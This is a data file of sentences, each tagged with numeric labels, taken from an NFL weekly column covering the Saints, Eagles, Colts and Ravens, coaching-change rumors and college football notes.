"When he shows up at quarterback and hes out there, Im showing up with him, no matter how my body feels no matter, what Im going through, it doesnt matter.",-1,0
"I got to be out there with my guy.",-1,0
"I got to be that safety blanket for him.",-1,0
"Ted [Ginn] was down, younger players had to step, and I had to respond.",-1,0
"I got his back 100 percent.",-1,0
"Hes committed.",-1,0
"Im committed right along with him.",-1,0
"That commitment got tested the last few weeks.",-1,0
"But the Saints believe theyre coming out the other side of that slump better for having gone through it.",-1,0
"Another wild Sunday of football to recap, and a lot more to look forward to.",-1,0
"Heres what weve got for you to make sense of it all:
 Nick Foles flair for the dramatic, and Doug Pedersons stomach for fourth-down, has Philly rallying like its 2017.",-1,0
"We talk with Fletcher Cox and Zach Ertz on whether itll be enough.",-1,0
"The team standing in the Eagles way for the only remaining playoff spot in the NFC just so happens to be the one they played for the conference title last year, and the Vikings have rescued their season by reinventing themselvs on the fly in December.",-1,0
"Well explain how its happened (with a nod to Pat Shurmur).",-1,0
"Speaking of Shurmur, his Giants played their tails off in Indy but ran into a buzzsaw of a Colts team.",-1,0
"Indy coach Frank Reich explains to us how Andrew Luck becoming an extension of his staff out on the field has played into their turnaround, and was important when it mattered most on Sunday.",-1,0
"A look at the coaching carousel, with some quick hits from the rumor mill as Black Monday looms.",-1,0
"To explain that, well take you through the Ravens (smart) decision to go forward with their incumbent coach, John Harbaugh.",-1,0
"And well have all the elements youre used to getting each and every Monday.",-1,0
"But were starting in the Superdome, since we now know that the road to Atlanta, on the NFC sides, runs through there.",-1,0
"These arent the Saints of mid-November.",-1,0
"There have been bumps since then.",-1,0
"The Cowboys effectively took them into a dark alley and out of their element on Nov. 29, winning a 13-10 struggle during which the Saints could muster only 176 yards of total offense.",-1,0
"The next week, in Tampa, Brees and company were down 14-3 to the Bucs at halftime.",-1,0
"And last Monday he Saints were held out of the end zone until the second half again before grinding out a 12-9 win over the Panthers.",-1,0
"The good news?",-1,0
"The Saints took two of those three games, and those were won in a fashion that not every Payton/Brees team would be capable of riding to victory.",-1,0
"They rushed for more than 100 yards and held the opponent under 300 total yards in both wins, which was more than enough against the Bucs, and just enough in Charlotte.",-1,0
"We went to Dallas, that was our third game in 11 days, Thomas said.",-1,0
"And then we went on the road to playtwo games against divisional opponents who know us very well, who we play against a lot.",-1,0
"Its tough game.",-1,0
"Its all about how you respond.",-1,0
"The Saints passing offense finally did respond against the Steelers, when the team needed it most.",-1,0
"New Orleans, in fact, watched a 24-14 lead in the third quarter quickly melt into a 28-24 deficit, and so on Sunday, after three straight rock fights, theyd need to be in more than just survival mode.",-1,0
"The guys on offense knew theyd have to be the aggressors.",-1,0
"BISHOP: Drew Brees Is Hiding in Plain Sight
In case Thomas needed it, he got a reminder from veteran Ted Ginn, who was coming back off IR after having his knee scope.",-1,0
"He was saying, Its on us, man, Thomas said.",-1,0
"Lets go now.",-1,0
"The two ex-Ohio State stars sure did take it on themselves.",-1,0
"After Pittsburghs ill-fated fake punt attempt, the Saints got the ball at the Steelers 46 with 4:06 left.",-1,0
"Ginn picked up a first down on a second-and-5 from the 41, and Thomas drew a (questionable) interference call on fourth-and-2 four plays later to extend the drive.",-1,0
"Ginn came back next in converting third-and-20, and then it was Thomas turn with the 2-yard touchdown.",-1,0
"And for the first time in a month, the Saints offense was the Saints offense again.",-1,0
"You knew eventually it was going to happen, Thomas said.",-1,0
"We dont play this game, we dont prepare the way we do to not get better.",-1,0
"Were in the business of getting better.",-1,0
"So I would say eventually it was going to happen.",-1,0
"And I would also add that having Ted Ginn back adds a spark.",-1,0
"It gives us the  ability to do some different things.",-1,0
"And were just playing for one another.",-1,0
"Coach told us it will be a playoff atmosphere game, and we responded.",-1,0
"While they wouldnt necessarily sign up again for what they just battled through, the Saints do believe theyre better for it.",-1,0
"The defense hasnt allowed a fourth-quarter point in a month, largely because thats what it needed to do over the last four games.",-1,0
"Theyre more physical on offense, too, because theyve had to lean on the run game more.",-1,0
"All of which should serve the Saints well.",-1,0
"As will, at least on paper, the fact that New Orleans can treat its Week 17 game against the Panthers however it wants to treat it, and head forward with home-field throughout the NFC playoffs.",-1,0
"JONES:The Steelers Look Like Pretenders
Weve held the No.1 seed for a couple times this year, Thomas said.",-1,0
"We knew teams were going to give us our best shot.",-1,0
"We were playing desperate teams that were going to come here and try to beat us.",-1,0
"We just couldnt fold and now we actually get a chance to take deep breath, and get a little bit of time to rest up now.",-1,0
"Its been a hard-fought season, and now its time to take it up another another notch.",-1,0
"I asked Thomas if he wants to play next week, and he intimated that hed like to break Joe Horns franchise record for single-season receiving yardshes 23 yards off the mark of 1,399.",-1,0
"But if he doesnt get there, its not the end of the world.",-1,0
"Everyone there in New Orleans has something bigger in mind.",-1,0
"Five of the NFCs six playoff spots are taken.",-1,0
"That leaves two teams battling over one piece of bracket real estateand those two just so happen to be the two that went head-to-head in the NFC title game 11 months ago.",-1,0
"And if Im Philly this morning, two things are making me feel like its 2017 all over again.",-1,0
"The first, and obvious, is how the team has rallied around Nick Foles the last two weeks.",-1,0
"Foles was pretty good in the win over the Rams eight days ago (24-31, 270 yards, one INT), and pretty great in helping stave off a furious Texans comeback on Sunday (35-49, 471 yards, four TDs, one INT) in a 32-30 win.",-1,0
"Nick has shown these past two years that hes not a backup quarterback, tight end Zach Ertz told me Sunday night.",-1,0
"Hes not a backup-caliber quarterback.",-1,0
"When hes in the game on offense leading us at quarterback, the offense isnt going to change very much.",-1,0
"We got two extremely talented signal callers back there, and its Nicks turn right now to kind of carry us on our offense.",-1,0
"Carry the Eagles, Foles did.",-1,0
"On the games decisive drive, he made two big-time throws to convert a pair of third-and-10s.",-1,0
"On the first one, from his own 11, he stood in and took a shot from Houstons Jadeveon Clowney as he delivered 19-yard strike to Alshon Jeffery.",-1,0
"On the second one, Ertz slipped past the defense off a scissors concept, and Foles found him for 20 yards to set up Jake Elliotts game-winner.",-1,0
"Nick battled his butt off tonight, Ertz said.",-1,0
"And that brings us to the other 2017-ish element you saw on Sunday.",-1,0
"The Eagles first two touchdowns came onyou guessed itfourth down.",-1,0
"The first was on fourth-and-2 from the Philly 37.",-1,0
"Darren Sproles took a swing pass and made two defenders miss on the way to the end zone.",-1,0
"The second was on fourth-and-goal from the 1, with Ertz slipping underneath coverage out of a bunch formation for the score.",-1,0
"Doug [Pederson], when hes aggressive like that and he puts the trust in us as players, its like, Man, this guy truly believes that were going to execute over and over again, Ertz said.",-1,0
"And I think that just allows us to play with such a confidence, a swagger almost, because we have a coach whos willing to bet on us.",-1,0
"So we should play with that same confidence, if not more.",-1,0
"And the defensive guys see it the same waythat their coach is willing to take the risk in those situations knowing that hes backstopped by a unit he trusts.",-1,0
"If we dont get [the first down], then we got go and fight for that field position back and try to get a sack or TFL, just try to get a turnover depending on where the balls at, defensive tackle Fletcher Cox said just after the game.",-1,0
"So we just stay calm and if we dont get it we go out and try to get the offense the ball back quick.",-1,0
"Similarly, the offense picked up the defense after Deshaun Watson guided the Texans back from a 29-16 deficit.",-1,0
"And that gave Elliott the chance to make up for the missed extra point that put Philly in that precarious spotdown 30-29 lateto begin with.",-1,0
"The downside for the Eagles?",-1,0
"They still dont control their destiny.",-1,0
"Should the Vikings win against the Bears on Sunday, Philly wont make the playoffs.",-1,0
"And maybe thatd be a shamebut for right now they cant get wrapped up in it.",-1,0
"We dont control our own destiny and thats unfortunate, Ertz said.",-1,0
"This is the bed that weve laid in.",-1,0
"But we were 4-6 coming off a real bad loss to the Saints, and a lot of guys wouldve kind of thrown in the towel, and it was the exact opposite.",-1,0
"Guys rallied.",-1,0
"Guys got back to work.",-1,0
"We practiced extremely hard all year, and after that game against the Saints we just got back to work.",-1,0
"No one panicked.",-1,0
"No one was pointing fingers.",-1,0
"We just said, Hey, we got to flip the switch, we got to be playing our best football late in the year.",-1,0
"They are now.",-1,0
"Well see if its too late.",-1,0
"Its been pretty well-established in Indy for some time that Andrew Luck is back to being Andrew Luck, but there are still nice signs along the way.",-1,0
"And Sunday gave the Colts brass one of those glimpses in the biggest of moments.",-1,0
"On first-and-goal with 59 seconds left, and the Colts down 27-21, Reich sent a run play in.",-1,0
"Luck got to the line.",-1,0
"He quickly diagnosed the Giants defensetight man-to-man coverage, allowing for extra defenders in the box.",-1,0
"He immediately mentally flipped to Indys attacker family of plays, man-coverage-beating concepts built for the situation at hand.",-1,0
"He then checked to a play designed to go to Chester Rogers.",-1,0
"The call had T.Y.",-1,0
"Hilton wide left, with Rogers in the slot.",-1,0
"At the snap, Hilton broke inside and got in Giants corner Grant Haleys way, which freed Rogers into the flat.",-1,0
"And from there, it was candy from a baby.",-1,0
"Luck dropped the balll into Rogers hands, and the Colts were ahead.",-1,0
"A pick of Eli Manning on the Giants final drive sealed the win.",-1,0
"Just as significant?",-1,0
"How Luck really has become an extension of Reich.",-1,0
"Now that hes physically OK, thats where the strides keep coming for the Colts quarterback.",-1,0
"Hes like a coach out there, Reich told me a couple hours after the game.",-1,0
"We have such good communication and belief in what were doing.",-1,0
"When we have time to talk about things in between, we can talk to him about two or three plays.",-1,0
"Get his preferences, talk things through, if were going to check to something.",-1,0
"And just as Lucks come along, so have the Colts.",-1,0
"They started 1-5.",-1,0
"Theyve gone 8-1 since.",-1,0
"But this isnt just about the quarterback, great as hes been.",-1,0
"Weve talked a lot over the last few weeks about the reclamation of the offensive line, and the bumper crop of 2018 draft picks, and the money the Colts will have to spend in 2019.",-1,0
"In short, theyre as well as positioned for the future as anyone in the league.",-1,0
"What they are now is a team that can win in a bunch of different ways.",-1,0
"Against Dallas in Week 15, it was with an overwhelming running game and defense, with Luck playing caretaker.",-1,0
"This week the quarterback threw for 357 yards and guided Indy back from a 10-point deficit in the second half.",-1,0
"When you look over the years at the good football teams, theyll able to win different kinds of games, Reich said.",-1,0
"Low-scoring games, high-scoring games, games you got to come from behind, games youve got to hold the ball.",-1,0
"And so this stretch that were on, were hitting a variety of those types of wins.",-1,0
"And I do think [winning those is] a good sign.",-1,0
"It alls sets up an awesome Week 17 in the AFC South.",-1,0
"The Texans, who are already in the playoffs, win the division if they can beat Jacksonville.",-1,0
"If that doesnt happen, the winner of Colts-Titans takes the South.",-1,0
"And at this point, its safe to say the arrows pointing up on three of the four AFC South team.",-1,0
"The Jags are the exception, which few wouldve seen coming just a few months ago.",-1,0
"The Ravens decision to stick with coach John Harbaugha smart decisioncan give everyone a window into the internal debate that some teams are having as it comes time for struggling franchises to make calls on their future.",-1,0
"There was a time a couple months ago when most of the league assumed Harbaugh and the Ravens were driving towards a separation, however you wanted to term that, following this, his 11th season as coach in Baltimore.",-1,0
"But as the team got hot, upper management started asking a very simple, sensical question: In a year when the pool of candidates is shallow, why are we going to walk away from the man wholl be the No.",-1,0
"1 candidate on most teams lists?",-1,0
"There was no shortage of teams that had an interest in Harbaugh.",-1,0
"The Jets were one.",-1,0
"The Broncos were another.",-1,0
"And it was never hard to see why.",-1,0
"Harbaugh made the playoff six times in his first decade with the Ravens, winning at least once in the postseason in each of those seasons, while taking home a Super Bowl title in 2012.",-1,0
"So Baltimore decided over the last week that, at the very least, theyre not going to just let him walk.",-1,0
"Which is wise of them, in the same way its wise of other teams to make sure theyre happy with whats out there in the marketplace before deciding to sever ties with the coach theyve got now.",-1,0
"And theres also the way that Harbaugh handled the situation with his players when the rumblings really got going.",-1,0
"Veteran safety Eric Weddle explained that the coach told them hed been in contact with owner Steve Bisciotti throughout and that, while he wasnt certain of his own future, they didnt need to worry about him.",-1,0
"He then told the players, Im with you and Im for you.",-1,0
"Its nice to put it to rest, Weddle said via text late Saturday, after the Ravens beat the Chargers in Los Angeles.",-1,0
"Hes been very up front and honest with us, and hes done an amazing job keeping us together, to have us in the position were in right now.",-1,0
"Its how honest hes been and how hes believed from Day 1.",-1,0
"His love and belief really have resonated through the entire team.",-1,0
"Maybe the biggest compliment the players could give Harbaugh, though, came in how they played against the Chargersbecause it completely reflected their coachs vision for a program and a team.",-1,0
"Against another pretty physical group, Baltimore controlled the line on scrimmage, nearly doubling up the Chargers in scrimmage yards (361-198) and tripling them on the ground (159-51).",-1,0
"It also showed up in how Baltimore wound up breaking their hostspunching the ball out lateand also in how the Ravens handled the circumstance of traveling cross-country on a short week to play a really good team coming off nine days rest.",-1,0
"Afterwards, Harbaugh told the players that the Ravens are a strong, butt-kicking outfit, and gave the game ball to strength coach Steve Saunders.",-1,0
"But the guys in the locker room know that reaching this pointa win against Cleveland next Sunday and theyre division champs, something that seemed out of the question midway through the seasonhas had as much to do with the guy whos setting their course.",-1,0
"One-hundred percent, Weddle said.",-1,0
"We want to hit people in the mouthphysical in all three phases, make em quit in the fourth.",-1,0
"Thats pretty much how it played out, and the Ravens organization signed up for more of it.",-1,0
"So with that theme as the backdrop, and seven days ahead of Black Monday, some nuggets from the rumor mill:
Panthers GM Marty Hurney has built a good rapport with new owner David Tepper, Im told, and so he and coach Ron Rivera are very likely to get at least another year.",-1,0
"I dont think its out of the realm of possibility that someone could be added to football ops.",-1,0
"Teppers shown a keen awareness in the area of football analytics, so maybe thats where a hire is made.",-1,0
"At the very least, with offensive coordinator Byron Leftwich not quite ready for the role he was thrust into in October, the Cardinals will make major changes to its offensive staff.",-1,0
"And theres a pretty decent chance that owner Michael Bidwill goes beyond just that.",-1,0
"First-year coach Steve Wilks is in peril.",-1,0
"It remains to be seen whether or not GM Steve Keim is, too.",-1,0
"If Keim is out in Arizona, word is that hell be a top candidate for the GM job with the Raiders, who would prefer to bring in an experienced personnel man.",-1,0
"The Buccaneers are a little like Arizona in that word has held that the coach, Dirk Koettter, is likely to be gone, particularly with a staff full of assistants on expiring deals, but the situation of GM Jason Licht seems to be murkier.",-1,0
"This job is the one that ex-Packers coach Mike McCarthy has been connected most to.",-1,0
"The Dolphins will almost certainly have change at some level.",-1,0
"Id be surprised if both EVP Mike Tannenbaum and coach Adam Gase are back, and a total blowup is not out of the question.",-1,0
"If Gase survives, its a decent bet that GM Chris Grier would too, with perhaps added authority.",-1,0
"The Packers search is underway, and the one name that multiple folks brought up over the last week was Northwestern coach Pat Fitzgerald, who was hired into that job by Green Bay president/ex-NU AD Mark Murphy.",-1,0
"Murphys running the show here, with half-dozen execs, including GM Brian Gutekunst, working with him.",-1,0
"Im told the Browns process will be absolutely wide open.",-1,0
"Vance Joseph is all but done in Denver.",-1,0
"As weve mentioned at a few points over the last few months, Broncos GM John Elway dove deep into offensive trends in the college game during the fall.",-1,0
"So an outside-the-box hire wouldnt be out of the question, assuming the scenario of John Harbaugh coming over, with Gary Kubiak as OC, is now dead.",-1,0
"As for the Bengals, theres been talk that owner Mike Brown could take one more run at it with Marvin Lewis in charge in 2019, before Brown cedes more control of the team  than he already has to his children after next season.",-1,0
"Brown is 83.",-1,0
"Josephs name has popped up in recent weeks as a potential heir to Lewis, since the Brown family has coveted familiarity in their hires (Joseph was DBs coach in Cincinnati in 2014-15).",-1,0
"Of course, well have plenty more coaching news on the site in the coming days.",-1,0
"The college football picture, from an NFL perspective.",-1,0
"1.",-1,0
"Lots of buzz out there on Georgia QB Justin Fields potentially transferring to Ohio Stateand that the big lure would be the presence of new Buckeyes coach Ryan Day as a sort of quarterback whisper, given the development of Dwayne Haskins under Days tutelage as offensive coordinator.",-1,0
"What does that have to do with the NFL?",-1,0
"Day was Mike Vrabels first choice for Titans offensive coordinator last year.",-1,0
"Days remaining in Columbus worked out OK, but two things to take away: First, this underscores the importance of a coach knowing what assistants to fill his staff out with.",-1,0
"And second, it shows that the NFL would probably benefit from being open-minded to pilfering play-callers from college (Bucs OC Todd Monken is another one).",-1,0
"2.",-1,0
"Since a lot of high school kids signed national letters of intent this week, I figured itd be cool to look back five years and see how predictive the high school rankings are of NFL success.",-1,0
"What I found?",-1,0
"Theyre not bad.",-1,0
"The Top 12 from the class of 2014: Myles Garrett (Browns), Leonard Fournette (Jaguars), Cam Robinson (Jaguars), Jabrill Peppers (Browns), Kyle Allen (Panthers), Speedy Noil (n/a), DaShawn Hand (Lions), Quin Blanding (n/a), Andrew Brown (Bengals), Marlon Humphrey (Ravens), Rashaan Evans (Titans) and Dalvin Cook (Vikings).",-1,0
"Thats 10 pros, including five first-round picks and two second-round picks.",-1,0
"3.",-1,0
"Last week I wrote that Nick Bosa really is considered separate from the rest of the edge rushing prospects.",-1,0
"And after a little more time on the phone this week, Id say the same goes Alabamas Quinnen Williams among defensive tackles, even in a bumper crop at the position.",-1,0
"Thats a pretty surprising, too, considering how much attention Houstons Ed Oliver got before the season, a point at which Williams was still working on nailing down a starting job for the first time.",-1,0
"If you want to take a look, youll get to see him against Oklahoma on Saturday.",-1,0
"2019 MOCK DRAFT 3.0:Two QBs slide into the top 10, and a third into the first round
4.",-1,0
"Speaking of which, that Orange Bowl also gives everyone who hasnt been a watching a good chance to see Oklahoma coach Lincoln Riley call a game.",-1,0
"5.",-1,0
"And the cool thing about the other semifinal?",-1,0
"In the Cotton Bowl, itll be D-Line U (Clemson) vs. O-Line U (Notre Dame), which figures to test the Tigers much ballyhooed front of Clelin Ferrell, Dexter Lawrence, Christian Wilkins and Austin Bryant.",-1,0
"6.",-1,0
"Via my buddy Bruce Feldman of The Athletic: In addition to Nick Sabans own No.",-1,0
"1-ranked recruiting class, the classes currently ranked No.",-1,0
"2, 3 and 6 were put together by ex-Saban assistants, which is bananas.",-1,0
"Not sure I can remember a coach reigning over a sport both in wins and influence quite like Saban is now.",-1,0
"We really are watching college footballs answer to UCLA legend John Wooden.",-1,0
"QUOTE
Good to see someone still cares about the Pro Bowl, but this seems like a drastic measure to protest exclusion from a game no one wants to play in.",-1,0
"And Johnson probably just has to wait a week or two anyway.",-1,0
"By then there will have been enough phantom sprained ankles and twisted knees to get him in.",-1,0
"TWEET
From my old NFL Network colleague Kara Hendersonand shes right, by the way.",-1,0
"Too many kids are being told too young that they need to drop everything else to pursue a scholarship in a single sport.",-1,0
"And thats even though just about every high school coach Ive ever come across agrees that its best for any athlete to play multiple sports through his or her teens, for reasons connected to both skill (developing a diversified set of athletic traits) and health (avoiding overstressing certain muscles).",-1,0
"You can argue that after that, specialization makes sense.",-1,0
"Ex-college QBs Drew Henson (Michigan) and Ronald Curry (North Carolina) are examples of guys who may have juggled for too long.",-1,0
"But Id dare you to find an athlete who lost a scholarship because juggled in high school, because I dont youll find one.",-1,0
"OK, rant over.",-1,0
"The 2018 Patriots may not go down even in the top 10 teams of the Brady/Belichick era, but the bar the Patriots have set for themselves, and everyone else, is beyond absurd.",-1,0
"Consider this: When Brady blew out his ACL in 2008, they were coming off their fifth straight AFC East title.",-1,0
"In the 10 seasons since he came back from the injury, all they have done is double that streak.",-1,0
"CLIP
Is this petty?",-1,0
"Probably.",-1,0
"But no one was going to change the identity of a team like the Cleveland Browns by being subtle.",-1,0
"And Baker Mayfield sure isnt trying to be subtle.",-1,0
"MEME
Sorry Roosevelt Nix.",-1,0
"That one wont get old for a while.",-1,0
"S/O to 
Everyone who gave to my impromptu drive to raise a few bucks for Boston Childrens Hospital.",-1,0
"The backstory is pretty simple.",-1,0
"The people at BRANDed PR and FOCO sent me a Patriots Christmas sweater a few weeks back, and I let it sit on my desk (for obvious reasons, I dont wear any NFL team gear, nor do I root for a team).",-1,0
"Then last week, I saw the reaction Bears QB Mitchell Trubisky got for wearing the Chicago version of the sweater as his press conference, and I figured I could use this one to raise some money for BCH (where my wife is a nurse).",-1,0
"So I put the proposal out there, and at last check, despite starting this up late on a Friday night over a holiday weekend, you guys raised $1,317.",-1,0
"Ive left the page open if anyone who wants to give, and Ill draw a winner on Christmas Eve.",-1,0
"One thing I can promise: The moneys going to an incredible place.",-1,0
"The staffers there are angels working to create miracles.",-1,0
"So anyway, thanks to everyone who helped out.",-1,0
"1.",-1,0
